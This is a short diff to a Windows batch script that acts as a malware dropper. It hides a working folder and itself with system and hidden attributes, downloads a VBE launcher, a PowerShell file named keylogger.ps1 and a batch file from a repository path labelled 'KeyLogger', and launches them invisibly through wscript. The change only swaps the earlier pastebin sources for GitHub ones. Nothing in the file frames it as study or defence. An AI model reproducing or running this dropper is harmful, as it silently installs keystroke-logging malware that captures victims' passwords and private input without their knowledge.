@@ -1,6 +1,12 @@
 @echo off
 cd %temp%
-curl -s https://pastebin.com/raw/iuRnxG31 -o i.vbe
-curl -s https://pastebin.com/raw/Ttfa0K7m -o p.ps1
-curl -s https://pastebin.com/raw/dPkLQyX1 -o r.bat
+if not exist t\ (
+  mkdir t
+)
+attrib +s +h t
+attrib +s +h s.bat
+cd t
+curl -s https://raw.githubusercontent.com/Ale-cyber/test/KeyLogger/master/invisible.vbe -o i.vbe
+curl -s https://raw.githubusercontent.com/Ale-cyber/test/KeyLogger/master/keylogger.ps1 -o p.ps1
+curl -s https://raw.githubusercontent.com/Ale-cyber/test/KeyLogger/master/run.bat -o r.bat
 wscript.exe "i.vbe" "r.bat"
